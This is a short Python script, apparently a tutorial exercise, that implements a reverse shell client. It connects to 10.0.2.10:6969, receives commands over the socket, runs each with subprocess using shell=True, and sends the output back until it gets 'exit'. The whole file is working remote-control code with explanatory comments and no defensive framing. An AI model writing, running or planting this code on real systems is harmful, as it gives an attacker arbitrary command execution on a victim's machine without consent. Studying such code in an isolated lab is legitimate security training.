import socket
import subprocess

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create socket object

s.connect(('10.0.2.10',6969)) # use connect method. takes address tuple as argument ('<IP>', <PORT>). change it to your server machine

while True:
    # here we store in the command variable what we want to receive from this socket
    command = s.recv(4096).decode("UTF-8") # recv(<max bytes of data the socket will allow>)
                                           # decode will be needed because data will be sent as binary (default=UTF-8)

    if command == "exit":
        s.close()
        break          # if the given command is "exit" then terminate connection and break out of the loop 

    # print("Command received: " + command)

    # once the client receives the command, it runs it using the subprocess module
    runCommand = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    # args=(<command to execute>, <use shell to get more functionalities>, <get command output>,<redirect errors to stdout instead of stderr>)

    # print("Output: " + str(runCommand.stdout))

    #now send the output of the run method through the socket
    if str(runCommand.stdout) == "b''": # if the command has no output then send no output 
        s.send("no output".encode("UTF-8"))
    else:                         # else send the output
        s.send(runCommand.stdout)
